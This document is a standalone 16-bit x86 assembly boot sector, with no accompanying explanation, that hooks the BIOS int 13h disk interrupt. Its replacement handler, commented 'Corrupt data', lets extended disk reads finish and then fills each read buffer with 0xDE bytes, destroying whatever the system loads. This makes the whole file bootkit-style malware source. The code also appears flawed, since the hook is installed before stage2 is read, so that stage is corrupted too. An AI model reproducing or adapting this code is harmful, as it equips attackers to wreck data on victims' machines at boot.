[ORG 0x7C00]
[BITS 16]

%define STAGE2_SEGMENT 0x1000
%define STACK_TOP 0x7C00

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, STACK_TOP
    sti

    mov [boot_drive], dl

    ; Install int 13h handler
    mov ax, [es:0x13*4]
    mov [old_int13], ax
    mov ax, [es:0x13*4+2]
    mov [old_int13+2], ax
    mov word [es:0x13*4], int13_handler
    mov [es:0x13*4+2], cs

    ; Load stage2
    mov ah, 0x42
    mov dl, [boot_drive]
    mov si, dap
    int 0x13
    jc disk_error

    jmp STAGE2_SEGMENT:0x0000

int13_handler:
    cmp ah, 0x42
    je .extended_read
    jmp far [cs:old_int13]

.extended_read:
    pusha
    push es
    push ds

    ; Save DAP pointer
    mov [dap_ptr], si

    ; Call original handler
    pushf
    call far [cs:old_int13]
    jc .error

    ; Corrupt data
    mov si, [cs:dap_ptr]
    mov cx, [si + 2]    ; Sector count
    shl cx, 9            ; Convert to bytes (512 * sectors)
    les di, [si + 8]    ; Buffer pointer

    mov al, 0xDE
    rep stosb

.error:
    pop ds
    pop es
    popa
    retf 2

disk_error:
    mov si, error_msg
    call print_string
    hlt

print_string:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print_string
.done:
    ret

; Data
boot_drive db 0
old_int13 dd 0
dap_ptr dw 0
error_msg db "Disk error!", 0

; Disk Access Packet
dap:
    db 0x10        ; Size of DAP
    db 0           ; Reserved
    dw 4           ; Number of sectors
    dw 0           ; Offset
    dw STAGE2_SEGMENT ; Segment
    dq 1           ; Starting sector

times 510-($-$$) db 0
dw 0xAA55